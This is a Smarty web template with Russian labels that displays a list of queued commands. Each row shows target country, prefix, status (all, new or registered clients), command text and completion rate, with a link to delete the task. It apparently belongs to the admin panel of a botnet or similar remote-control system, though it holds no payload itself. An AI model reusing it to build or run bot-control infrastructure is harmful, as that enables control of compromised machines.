<form action="#" enctype="application/x-www-form-urlencoded" method="post" name="add_sub{$rand_name}" id="add_sub{$rand_name}" onsubmit="return false;">

<table cellspacing="1" cellpadding="5" style="width:100%; font-size:10px; text-align: center;" >
<tr class="bg3">
    <td style="width:15%;">Страна</td>
    <td style="width:10%;">Префикс</td>
    <td style="width:5%;">Статус</td>
    <td style="width:50%;">Команла</td>
    <td style="width:20%;">Выполнено</td>
    <td style="width:1px;">&nbsp;</td>
  </tr>
{foreach from=$cmds item=cmd name=list_cmds}
{if $smarty.foreach.list_cmds.iteration is not even}{assign var=bg value=1}{else}{assign var=bg value=2}{/if}
<tr class="bg{if $cmd->dev eq 1}dev{/if}{$bg}" onMouseMove="this.className = 'bg4'" onMouseOut="this.className = 'bg{if $cmd->dev eq 1}dev{/if}{$bg}'" {if $cmd->enable eq 0}style="background-color: #666#F0F"{/if}>
    <th>   
    {if $cmd->country eq '*'}Все{else}{$cmd->country|country_s}{/if}
   	</th>
    <th>{if $cmd->prefix eq '*'}Все{else}{$cmd->prefix|replace:'|':'<br />'}{/if}</th>
    <th>{if $cmd->online eq 1}Все{elseif $cmd->online eq 2}Новым{elseif $cmd->online eq 3}Зарег.{/if}</th>
    <th style="font-size:9px">{$cmd->cmd}</th>
    {if $cmd->max > 0}
    <th title="{$cmd->count} из {$cmd->max}">{(($cmd->count / $cmd->max) * 100)|number_format:2}%</th>
    {else}<th>{$cmd->count}</th>{/if}
    <th><a href="#" onclick="return delete_cmd('{$admin->id}', '{$cmd->id}',document.forms['add_sub{$rand_name}'].parentNode.id.replace('_content', ''));"><img src="/images/delete.png" alt="Удалить данное задание" title="Удалить данное задание" border="0"></a></th>
  </tr>
{/foreach}
</table>

</form>

<script language="javascript" type="application/javascript">
var id_{$rand_name} = document.forms['add_sub{$rand_name}'].parentNode.id.replace('_content', '');
document.getElementById(id_{$rand_name} + '_title').innerHTML = 'Список комманда  - {$admin->link}';

</script>